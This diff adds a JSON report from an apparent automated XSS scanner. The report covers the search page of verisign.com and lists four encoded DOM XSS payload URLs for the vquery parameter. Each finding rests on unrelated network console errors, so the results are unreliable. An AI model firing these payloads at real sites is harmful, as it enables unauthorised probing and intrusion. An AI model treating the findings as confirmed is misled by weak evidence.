@@ -1,0 +1,88 @@
+{
+  "scan_info": {
+    "target_url": "https://www.verisign.com/search/",
+    "timestamp": "2026-02-13T09:37:07.217924",
+    "scanner": "Advanced XSS Exploit Plugin",
+    "version": "1.0.0"
+  },
+  "summary": {
+    "total_vulnerabilities": 4,
+    "severity_breakdown": {
+      "high": 0,
+      "medium": 4,
+      "low": 0
+    },
+    "vulnerability_types": [
+      "dom"
+    ]
+  },
+  "findings": [
+    {
+      "type": "dom",
+      "url": "https://www.verisign.com/search/?vquery=%3Ctextarea+onfocus%3Dalert%281%29+autofocus%3E",
+      "parameter": "vquery",
+      "method": "GET",
+      "payload": "<textarea onfocus=alert(1) autofocus>",
+      "context": "dom",
+      "evidence": "Potential DOM XSS - Console errors detected",
+      "console_logs": [
+        "https://cdn.cookielaw.org/consent/51830805-5d0b-4714-b341-130e1ef96d80/01978ec0-6fde-70fd-87f9-f7924739ccca/en-us.json - Failed to load resource: net::ERR_NETWORK_CHANGED",
+        "https://cdn.cookielaw.org/scripttemplates/202505.2.0/otBannerSdk.js 6:500310 Uncaught TypeError: Cannot read properties of undefined (reading 'DomainData')",
+        "https://api-us1.cludo.com/api/v3/10000064/10000072/search - Failed to load resource: net::ERR_NETWORK_CHANGED",
+        "https://dpm.demdex.net/id?d_visid_ver=5.5.0&d_fieldgroup=MC&d_rtbd=json&d_ver=2&d_verify=1&d_orgid=5CD56BB15B4E63710A495CB6%40AdobeOrg&d_nsid=0&d_coppa=true&ts=1770974975383 - Failed to load resource: net::ERR_NETWORK_CHANGED",
+        "https://www.verisign.com/search/#?vquery=%3Ctextarea+onfocus%3Dalert%281%29+autofocus%3E 0:0 Uncaught TypeError: Failed to fetch"
+      ],
+      "severity": "medium",
+      "timestamp": "2026-02-13T09:29:38.766505"
+    },
+    {
+      "type": "dom",
+      "url": "https://www.verisign.com/search/?vquery=%3Cvideo%3E%3Csource+onerror%3D%22alert%281%29%22%3E",
+      "parameter": "vquery",
+      "method": "GET",
+      "payload": "<video><source onerror=\"alert(1)\">",
+      "context": "dom",
+      "evidence": "Potential DOM XSS - Console errors detected",
+      "console_logs": [
+        "https://api-us1.cludo.com/api/v3/10000064/10000072/search - Failed to load resource: net::ERR_NETWORK_CHANGED",
+        "https://dpm.demdex.net/id?d_visid_ver=5.5.0&d_fieldgroup=MC&d_rtbd=json&d_ver=2&d_verify=1&d_orgid=5CD56BB15B4E63710A495CB6%40AdobeOrg&d_nsid=0&d_coppa=true&ts=1770975001849 - Failed to load resource: net::ERR_NETWORK_CHANGED",
+        "https://www.verisign.com/search/#?vquery=%3Cvideo%3E%3Csource+onerror%3D%22alert%281%29%22%3E 0:0 Uncaught TypeError: Failed to fetch"
+      ],
+      "severity": "medium",
+      "timestamp": "2026-02-13T09:30:06.357101"
+    },
+    {
+      "type": "dom",
+      "url": "https://www.verisign.com/search/?vquery=%22%3E%3Cimg+src%3Dx+onerror%3Dalert%281%29%2F%2F",
+      "parameter": "vquery",
+      "method": "GET",
+      "payload": "\"><img src=x onerror=alert(1)//",
+      "context": "dom",
+      "evidence": "Potential DOM XSS - Console errors detected",
+      "console_logs": [
+        "https://cdn.cookielaw.org/consent/51830805-5d0b-4714-b341-130e1ef96d80/01978ec0-6fde-70fd-87f9-f7924739ccca/en-us.json - Failed to load resource: net::ERR_NETWORK_CHANGED",
+        "https://cdn.cookielaw.org/scripttemplates/202505.2.0/otBannerSdk.js 6:500310 Uncaught TypeError: Cannot read properties of undefined (reading 'DomainData')",
+        "https://api-us1.cludo.com/api/v3/10000064/10000072/search - Failed to load resource: net::ERR_NETWORK_CHANGED",
+        "https://www.verisign.com/js/components/index.adef78706e6eca23e14267a764da9da280b8dc4e8ab4eae9152f6fbdf4babbf6.js 7:2105 Uncaught TypeError: Failed to fetch"
+      ],
+      "severity": "medium",
+      "timestamp": "2026-02-13T09:31:13.524786"
+    },
+    {
+      "type": "dom",
+      "url": "https://www.verisign.com/search/?vquery=data%3Atext%2Fhtml%2C%3Cscript%3Ealert%281%29%3C%2Fscript%3E",
+      "parameter": "vquery",
+      "method": "GET",
+      "payload": "data:text/html,<script>alert(1)</script>",
+      "context": "dom",
+      "evidence": "Potential DOM XSS - Console errors detected",
+      "console_logs": [
+        "https://cdn.cookielaw.org/scripttemplates/202505.2.0/otBannerSdk.js - Failed to load resource: net::ERR_NETWORK_CHANGED",
+        "https://api-us1.cludo.com/api/v3/10000064/10000072/search - Failed to load resource: net::ERR_NETWORK_CHANGED",
+        "https://www.verisign.com/js/components/index.adef78706e6eca23e14267a764da9da280b8dc4e8ab4eae9152f6fbdf4babbf6.js 7:2105 Uncaught TypeError: Failed to fetch"
+      ],
+      "severity": "medium",
+      "timestamp": "2026-02-13T09:32:39.061953"
+    }
+  ]
+}
